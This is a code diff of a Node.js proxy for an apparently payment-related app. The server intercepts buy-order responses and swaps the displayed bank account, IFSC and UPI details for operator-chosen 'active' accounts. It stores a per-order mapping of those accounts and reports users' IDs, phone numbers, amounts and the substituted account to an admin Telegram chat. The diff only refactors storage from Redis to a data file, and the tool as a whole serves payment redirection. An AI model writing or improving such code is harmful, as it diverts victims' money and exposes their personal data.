@@ -146,45 +146,35 @@ function getTokenFromReq(req) {
   return headers['authorization'] || headers['token'] || '';
 }
 
-const orderBankCache = {};
-
-async function saveOrderBank(orderId, bank) {
+async function saveOrderBank(data, orderId, bank) {
   if (!orderId || !bank || orderId === 'N/A') return;
-  const key = String(orderId);
-  const bankData = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc, bankName: bank.bankName || '', upiId: bank.upiId || '' };
-  orderBankCache[key] = bankData;
-  if (redis) redis.hset('nine99payOrderBankMap', key, JSON.stringify(bankData)).catch(()=>{});
+  if (!data.orderBankMap) data.orderBankMap = {};
+  data.orderBankMap[String(orderId)] = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc, bankName: bank.bankName || '', upiId: bank.upiId || '' };
+  await saveData(data);
 }
 
-async function saveOrderBankMultipleKeys(ids, bank) {
+async function saveOrderBankMultipleKeys(data, ids, bank) {
   if (!bank) return;
   const uniqueIds = [...new Set(ids.map(String).filter(id => id && id !== 'N/A'))];
+  if (uniqueIds.length === 0) return;
+  if (!data.orderBankMap) data.orderBankMap = {};
+  const bankData = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc, bankName: bank.bankName || '', upiId: bank.upiId || '' };
   for (const id of uniqueIds) {
-    await saveOrderBank(id, bank);
+    data.orderBankMap[id] = bankData;
   }
+  await saveData(data);
 }
 
-async function getOrderBank(orderId) {
-  if (!orderId) return null;
-  const key = String(orderId);
-  if (orderBankCache[key]) return orderBankCache[key];
-  if (redis) {
-    try {
-      const stored = await redis.hget('nine99payOrderBankMap', key);
-      if (stored) {
-        const parsed = typeof stored === 'string' ? JSON.parse(stored) : stored;
-        orderBankCache[key] = parsed;
-        return parsed;
-      }
-    } catch(e) {}
-  }
-  return null;
+function getOrderBank(data, orderId) {
+  if (!orderId || !data.orderBankMap) return null;
+  return data.orderBankMap[String(orderId)] || null;
 }
 
-async function getOrderBankMultiple(ids) {
+function getOrderBankMultiple(data, ids) {
+  if (!data.orderBankMap) return null;
   for (const id of ids) {
     if (!id) continue;
-    const bank = await getOrderBank(String(id));
+    const bank = data.orderBankMap[String(id)];
     if (bank) return bank;
   }
   return null;
@@ -1212,7 +1202,7 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     const orderId = allOrderIds[0] || 'N/A';
 
     if (respData) {
-      const savedBank = await getOrderBankMultiple(allOrderIds);
+      const savedBank = getOrderBankMultiple(data, allOrderIds);
       const bankToUse = savedBank || active;
       if (bankToUse) {
         if (Array.isArray(respData)) {
@@ -1228,15 +1218,16 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     if (data.adminChatId && bot && !isLogOff(data, detectedUserId)) {
       const amount = rd.amount || rd.orderAmount || rd.buyAmount || req.parsedBody?.amount || 'N/A';
       const phone = getPhone(data, detectedUserId);
+      const savedBank = getOrderBankMultiple(data, allOrderIds);
+      const bankUsed = savedBank || active;
       bot.sendMessage(data.adminChatId,
 `🔔 ${label}
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
-Order: ${orderId}
-IDs: ${allOrderIds.join(', ')}
-Amount: ₹${amount}
-Bank: ${active ? active.accountNo : 'N/A'}
-Acc: ${active ? active.accountHolder : 'None'}
-Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+📋 Order: ${orderId}
+💰 Amount: ₹${amount}
+💳 Bank: ${bankUsed ? `${bankUsed.accountHolder} | ${bankUsed.accountNo}` : 'N/A'}
+${savedBank ? '📌 Source: Saved for this order' : '⚡ Source: Active bank (no saved mapping)'}
+🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       ).catch(()=>{});
     }
 
@@ -1326,14 +1317,14 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
       const active = (eff.botEnabled !== false) ? getActiveBank(data, detectedUserId) : null;
       const getItemIds = (item) => [item.buyOrderNo, item.orderNo, item.orderId, item.buyOrderId, item.id].filter(Boolean);
       const bankMap = {};
-      await Promise.all(items.map(async (item) => {
+      for (const item of items) {
         const ids = getItemIds(item);
-        const bank = await getOrderBankMultiple(ids);
+        const bank = getOrderBankMultiple(data, ids);
         if (bank) {
           const primaryId = ids[0] || '';
           if (primaryId) bankMap[primaryId] = bank;
         }
-      }));
+      }
       for (const item of items) {
         const ids = getItemIds(item);
         const primaryId = ids[0] || '';
@@ -1408,7 +1399,7 @@ app.post('/app/buy/order', async (req, res) => {
       const eff = getEffectiveSettings(data, userId);
       const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, userId) : null;
       if (active) {
-        saveOrderBank(newOrderId, active);
+        saveOrderBank(data, newOrderId, active);
         if (data.adminChatId && bot) {
           bot.sendMessage(data.adminChatId, `🔗 Bank saved for Order: ${newOrderId}\n💳 ${active.accountHolder} | ${active.accountNo}`).catch(()=>{});
         }
@@ -1501,9 +1492,9 @@ app.all('/app/buy/order/processOrderNo', async (req, res) => {
     if (typeof respData === 'string' && respData.length > 5 && eff.botEnabled !== false) {
       const active = getActiveBank(data, detectedUserId);
       if (active) {
-        const existingBank = await getOrderBank(respData);
+        const existingBank = getOrderBank(data, respData);
         if (!existingBank) {
-          saveOrderBank(respData, active);
+          saveOrderBank(data, respData, active);
           if (data.adminChatId && bot) {
             bot.sendMessage(data.adminChatId, `🔗 processOrderNo: Bank saved for ${respData}\n💳 ${active.accountHolder} | ${active.accountNo}`).catch(()=>{});
           }
